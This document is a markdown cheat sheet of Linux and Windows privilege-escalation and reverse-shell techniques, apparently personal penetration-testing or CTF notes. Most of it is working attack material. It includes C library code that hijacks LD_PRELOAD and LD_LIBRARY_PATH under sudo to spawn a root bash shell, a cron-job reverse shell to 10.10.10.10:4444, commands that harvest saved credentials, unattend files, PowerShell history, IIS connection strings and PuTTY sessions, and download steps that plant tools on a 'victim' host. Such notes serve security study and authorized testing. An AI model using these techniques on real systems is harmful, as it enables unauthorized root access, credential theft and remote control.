# PrivEscalation
***
* ### Better listener shell experience
```python -c 'import pty;pty.spawn("/bin/bash")'``` 


* ### List sudo capability of the current user
```sudo -l```


* ### Find interesting binaries that can exploit shell
```find / -perm /6000 2>/dev/null | grep '/bin'```


* ### https://gtfobins.github.io/ followed the interesting tools that can exploit 


* ### env_keep exploit when ```sudo -l``` and ```ddl <thetargetedprogram>``` to find its libraries

> #### - Take advantage of LD_PRELOAD
a. compile the library.
```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/preload.c```
```#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

b. sudo program with the LD_PRELOAD
```sudo LD_PRELOAD=/tmp/preload.so program-name-here```

> #### - Take advantage of LD_LIBRARY_PATH
a. find the libraries used by the program
```ldd /usr/sbin/<program> #for example```

b. compile the library with one of the libraries name
```gcc -o /tmp/<libraryname> -shared -fPIC /home/user/library_path.c```
```#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

c. sudo program with the LD_LIBRARY_PATH
```sudo LD_LIBRARY_PATH=/tmp <programname>```


* ### Cron job if it's writable on /etc/crontab file (can use any available type of reverse shell http://revshells.com/ ):
```#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```


* ### Automated tools
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
LinEnum: https://github.com/rebootuser/LinEnum
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
Linux Priv Checker: https://github.com/linted/linuxprivchecker

* # Windows Commands

* ### unattended files found in
```
 C:\Unattend.xml
 C:\Windows\Panther\Unattend.xml
 C:\Windows\Panther\Unattend\Unattend.xml
 C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml	
```
* ### Powershell history 
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* ### Find saved credentials and use runas to open cmd of those creds
To list the credentials available for this user ```cmdkey /list``` 
To use that user's cmd ```runas /savecred /user:<USER> cmd.exe```

*### Find web.config that belong to IIS in those location
```
 C:\inetpub\wwwroot\web.config
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
and to find database connections in them use 
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

* ### Retrieve creds from PuTTy
```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```
	
	
# Reverse Shell
***
* ### https://www.revshells.com/

* ### MonkeyPenTest

* ### Start webserver using python ```sudo python3 -m http.server 80``` then download files into victim shell 
Linux :"wget <LOCAL-IP>/socat -O /tmp/socat"
Windows: "Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe"

